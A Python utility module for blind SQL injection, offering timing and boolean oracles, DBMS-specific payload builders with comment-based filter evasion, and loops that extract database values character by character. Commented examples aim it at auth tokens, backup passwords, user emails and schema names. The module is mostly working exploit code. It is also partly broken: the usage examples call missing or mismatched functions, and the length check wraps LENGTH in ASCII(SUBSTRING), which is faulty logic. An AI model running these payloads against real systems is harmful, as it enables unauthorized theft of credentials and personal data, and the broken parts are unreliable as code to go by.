"""
sqli_utils.py - Common SQL Injection helper utilities

This module provides timing-based and content-based inference primitives,
condition builders, extraction loops, and charset utilities
suitable for blind SQL injection exploitation.

Supports MySQL, PostgreSQL, and MSSQL-style injections.
"""

import time
import requests
from typing import Callable, Literal, Optional

# Default printable ASCII charset
DEFAULT_CHARSET = "".join(chr(i) for i in range(32, 127))


import time
from typing import Callable, Literal, Optional

DBMS = Literal["mysql", "postgres", "mssql"]


def time_based_oracle(
    query: str, send_fn: Callable[[str], float], threshold: float = 2.5
) -> bool:
    elapsed = send_fn(query)
    return elapsed >= threshold


def boolean_based_oracle(
    query: str, send_fn: Callable[[str], str], true_condition: Callable[[str], bool]
) -> bool:
    response_text = send_fn(query)
    return true_condition(response_text)


def build_ascii_condition(
    dbms: DBMS,
    column: str,
    table: str,
    row_clause: str,
    pos: int,
    ascii_val: int,
    op: Literal["=", ">", "<"] = "=",
) -> str:
    if dbms == "mysql":
        return (
            f"1/**/AND/**/IF((ASCII(SUBSTRING((SELECT/**/{column}/**/FROM/**/{table}/**/WHERE/**/{row_clause}),"
            f"{pos},1)){op}{ascii_val}),SLEEP(3),0)--"
        )
    elif dbms == "postgres":
        return f"1 AND CASE WHEN ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {row_clause})::text,{pos},1)){op}{ascii_val} THEN pg_sleep(3) ELSE pg_sleep(0) END--"
    elif dbms == "mssql":
        return f"1; IF(ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {row_clause}),{pos},1)){op}{ascii_val}) WAITFOR DELAY '0:0:3'--"
    else:
        raise ValueError("Unsupported DBMS")


def find_length(
    oracle_fn: Callable[[str], bool],
    dbms: DBMS,
    column: str,
    table: str,
    row_clause: str,
    max_len: int = 100,
) -> int:
    low, high = 1, max_len
    while low <= high:
        mid = (low + high) // 2
        condition = build_ascii_condition(
            dbms, f"LENGTH({column})", table, row_clause, 1, mid, op="="
        )
        if oracle_fn(condition):
            return mid
        condition = build_ascii_condition(
            dbms, f"LENGTH({column})", table, row_clause, 1, mid, op=">"
        )
        if oracle_fn(condition):
            low = mid + 1
        else:
            high = mid - 1
    raise Exception("Could not determine length")


def extract_string(
    length: int,
    oracle_fn: Callable[[str], bool],
    dbms: DBMS,
    column: str,
    table: str,
    row_clause: str,
    charset: str = "".join(chr(i) for i in range(32, 127)),
) -> str:
    result = ""
    for pos in range(1, length + 1):
        low, high = min(ord(c) for c in charset), max(ord(c) for c in charset)
        while low <= high:
            mid = (low + high) // 2
            condition = build_ascii_condition(
                dbms, column, table, row_clause, pos, mid, op=">"
            )
            if oracle_fn(condition):
                low = mid + 1
            else:
                eq_condition = build_ascii_condition(
                    dbms, column, table, row_clause, pos, mid, op="="
                )
                if oracle_fn(eq_condition):
                    result += chr(mid)
                    break
                else:
                    high = mid - 1
        else:
            result += "?"
    return result


# Example usage patterns (caller side):
#
# 1. Define a lambda-based oracle:
#    oracle_fn = lambda cond: time_based_oracle(url, "search", cond, method="GET", delay=3, proxies=burp)
#
# 2. Get length of a token:
#    length = find_length("SELECT token FROM users WHERE id=1", oracle_fn, dbms="mysql")
#
# 3. Extract token value:
#    token = extract_string("SELECT token FROM users WHERE id=1", length, oracle_fn, dbms="mysql")


# from sqli_utils import (
#     extract_field_value_binary,
#     infer_field_length,
#     get_charset_bounds,
# )

# # Setup
# field = "backup_password"
# table = "users"
# where = "id=1"
# charset = "alnum"
# min_ord, max_ord = get_charset_bounds(charset)

# # Determine length
# length = infer_field_length(
#     oracle_fn=oracle,
#     table=table,
#     field=field,
#     where=where,
#     max_length=32,
#     confirm_attempts=5,
# )

# # Extract value
# password = extract_field_value_binary(
#     oracle_fn=oracle,
#     table=table,
#     field=field,
#     where=where,
#     length=length,
#     min_ord=min_ord,
#     max_ord=max_ord,
# )
# print(f"Extracted password: {password}")

# Dump first email in AuthToken Table

# from sqli_utils import (
#     extract_field_value_binary,
#     infer_field_length,
#     get_charset_bounds,
# )

# table = "AuthToken"
# field = "email"
# where = "id=1"
# charset = "ascii"
# min_ord, max_ord = get_charset_bounds(charset)

# length = infer_field_length(oracle, table, field, where)
# email = extract_field_value_binary(
#     oracle, table, field, where, length, min_ord, max_ord
# )
# print(f"Extracted email: {email}")

# Discover Table Names

# from sqli_utils import infer_field_length

# schema = "chatdb"
# where = f"table_schema='{schema}' AND table_name LIKE 'Auth%'"

# length = infer_field_length(
#     oracle_fn=oracle,
#     table="information_schema.tables",
#     field="table_name",
#     where=where,
#     max_length=64,
# )
# print(f"Guessed length of table name: {length}")
